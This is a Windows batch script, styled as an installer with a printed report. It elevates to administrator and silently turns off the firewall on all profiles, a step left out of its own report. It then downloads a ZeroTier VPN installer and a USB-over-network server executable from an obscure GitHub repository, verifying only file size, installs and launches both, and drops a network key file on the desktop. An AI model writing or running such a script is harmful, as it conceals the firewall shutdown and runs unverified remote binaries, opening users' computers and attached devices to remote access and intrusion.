@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion

w32tm /config /manualpeerlist:"time.windows.com" /syncfromflags:manual /reliable:YES /update >nul 2>&1
tzutil /s "Arab Standard Time"
w32tm /resync /force >nul 2>&1

set "ZEROTIER_EXE=%ProgramFiles(x86)%\ZeroTier\One\zerotier_desktop_ui.exe"
set "DL=%USERPROFILE%\Downloads"
set "MSI=%DL%\ZeroTier One.msi"
set "VHUSB=%DL%\vhusbdwin64.exe"
set "REPORT=%TEMP%\setup_report_%RANDOM%.txt"
set "ZEROTIER_URL=https://github.com/vasiugbhfs/hlgbdffdoyu/raw/refs/heads/main/ZeroTier%%20One.msi"
set "VHUSB_URL=https://github.com/vasiugbhfs/hlgbdffdoyu/raw/refs/heads/main/vhusbdwin64.exe"
set "MSI_EXPECTED=11977216"
set "VHUSB_EXPECTED=3427248"
netsh advfirewall set allprofiles state off

(
echo ================================================
echo              INSTALLATION REPORT
echo ================================================
echo Date     : %DATE%
echo Time     : %TIME%
echo ================================================
echo.
echo [STEP 1] - Time Synchronization
echo Timezone : Arab Standard Time ^(Riyadh / Kuwait^)
echo Sync     : Completed successfully
echo.
) > "%REPORT%"

echo [STEP 2] - ZeroTier Installation Check >> "%REPORT%"

if exist "%ZEROTIER_EXE%" (
    echo ZeroTier UI  : Already installed >> "%REPORT%"
    goto STEP3
)

echo ZeroTier UI  : Not installed >> "%REPORT%"

if not exist "%MSI%" goto DOWNLOAD_MSI

for %%A in ("%MSI%") do set "MSI_SIZE=%%~zA"
echo MSI File     : Found ^(Size: !MSI_SIZE! bytes^) >> "%REPORT%"

if "!MSI_SIZE!"=="%MSI_EXPECTED%" (
    echo Size Check   : PASSED ^(%MSI_EXPECTED% bytes^) >> "%REPORT%"
    goto RUN_MSI
)

echo Size Check   : FAILED ^(Expected: %MSI_EXPECTED% - Got: !MSI_SIZE!^) >> "%REPORT%"
echo Action       : Deleting corrupted file and re-downloading... >> "%REPORT%"
del /f /q "%MSI%"

:DOWNLOAD_MSI
echo MSI File     : Downloading from repository... >> "%REPORT%"
powershell -Command "Invoke-WebRequest -Uri '%ZEROTIER_URL%' -OutFile '%MSI%' -UseBasicParsing"

if not exist "%MSI%" (
    echo Download     : FAILED - File not found after download >> "%REPORT%"
    goto STEP3
)

for %%A in ("%MSI%") do set "MSI_SIZE=%%~zA"
if "!MSI_SIZE!"=="%MSI_EXPECTED%" (
    echo Download     : Successful - Size verified ^(!MSI_SIZE! bytes^) >> "%REPORT%"
) else (
    echo Download     : FAILED - Size mismatch ^(Expected: %MSI_EXPECTED% - Got: !MSI_SIZE!^) >> "%REPORT%"
    goto STEP3
)

:RUN_MSI
echo Action       : Running ZeroTier installer... >> "%REPORT%"
start "" /wait msiexec /i "%MSI%" /qb /norestart
echo Installation : Completed >> "%REPORT%"

:STEP3
echo. >> "%REPORT%"
echo [STEP 3] - vhusbdwin64.exe Check >> "%REPORT%"

tasklist /FI "IMAGENAME eq vhusbdwin64.exe" 2>nul | find /I "vhusbdwin64.exe" >nul
if !errorlevel! equ 0 (
    echo Process      : vhusbdwin64.exe is already running >> "%REPORT%"
    goto STEP4
)

echo Process      : vhusbdwin64.exe is NOT running >> "%REPORT%"

if not exist "%VHUSB%" goto DOWNLOAD_VHUSB

for %%A in ("%VHUSB%") do set "VHUSB_SIZE=%%~zA"
echo File         : Found ^(Size: !VHUSB_SIZE! bytes^) >> "%REPORT%"

if "!VHUSB_SIZE!"=="%VHUSB_EXPECTED%" (
    echo Size Check   : PASSED ^(%VHUSB_EXPECTED% bytes^) >> "%REPORT%"
    goto RUN_VHUSB
)

echo Size Check   : FAILED ^(Expected: %VHUSB_EXPECTED% - Got: !VHUSB_SIZE!^) >> "%REPORT%"
echo Action       : Deleting corrupted file and re-downloading... >> "%REPORT%"
del /f /q "%VHUSB%"

:DOWNLOAD_VHUSB
echo File         : Downloading from repository... >> "%REPORT%"
powershell -Command "Invoke-WebRequest -Uri '%VHUSB_URL%' -OutFile '%VHUSB%' -UseBasicParsing"

if not exist "%VHUSB%" (
    echo Download     : FAILED - File not found after download >> "%REPORT%"
    goto STEP4
)

for %%A in ("%VHUSB%") do set "VHUSB_SIZE=%%~zA"
if "!VHUSB_SIZE!"=="%VHUSB_EXPECTED%" (
    echo Download     : Successful - Size verified ^(!VHUSB_SIZE! bytes^) >> "%REPORT%"
) else (
    echo Download     : FAILED - Size mismatch ^(Expected: %VHUSB_EXPECTED% - Got: !VHUSB_SIZE!^) >> "%REPORT%"
    goto STEP4
)

:RUN_VHUSB
start "" "%VHUSB%"
echo Launch       : vhusbdwin64.exe started successfully >> "%REPORT%"

:STEP4
echo. >> "%REPORT%"
echo [STEP 4] - ZeroTier Process Control >> "%REPORT%"

taskkill /F /IM "zerotier_desktop_ui.exe" >nul 2>&1
echo Action       : All ZeroTier instances stopped >> "%REPORT%"
timeout /t 2 /nobreak >nul

if exist "%ZEROTIER_EXE%" (
    start "" "%ZEROTIER_EXE%"
    echo Launch       : One clean ZeroTier instance started >> "%REPORT%"
) else (
    echo Launch       : SKIPPED - ZeroTier executable not found >> "%REPORT%"
)

:STEP5
echo. >> "%REPORT%"
echo ================================================ >> "%REPORT%"
echo [STEP 5] - Final Status >> "%REPORT%"
echo ================================================ >> "%REPORT%"

if exist "%ZEROTIER_EXE%" (
    echo ZeroTier     : [OK] Installed >> "%REPORT%"
) else (
    echo ZeroTier     : [MISSING] Not installed >> "%REPORT%"
)

set "ZT_COUNT=0"
for /f "tokens=1 delims=," %%A in ('tasklist /FI "IMAGENAME eq zerotier_desktop_ui.exe" /FO CSV /NH 2^>nul') do (
    if /I "%%~A"=="zerotier_desktop_ui.exe" set /a ZT_COUNT+=1
)
echo ZeroTier UI  : !ZT_COUNT! instance^(s^) running >> "%REPORT%"

tasklist /FI "IMAGENAME eq vhusbdwin64.exe" 2>nul | find /I "vhusbdwin64.exe" >nul
if !errorlevel! equ 0 (
    echo vhusbdwin64  : [OK] Running >> "%REPORT%"
) else (
    echo vhusbdwin64  : [NOT RUNNING] >> "%REPORT%"
)

echo. >> "%REPORT%"
echo Script finished at : %TIME% >> "%REPORT%"
echo ================================================ >> "%REPORT%"

cls
type "%REPORT%"
del /f /q "%REPORT%"
echo 8d1c312afa3df7f1> "%userprofile%\Desktop\net-key0000000.txt"
echo.
pause
endlocal
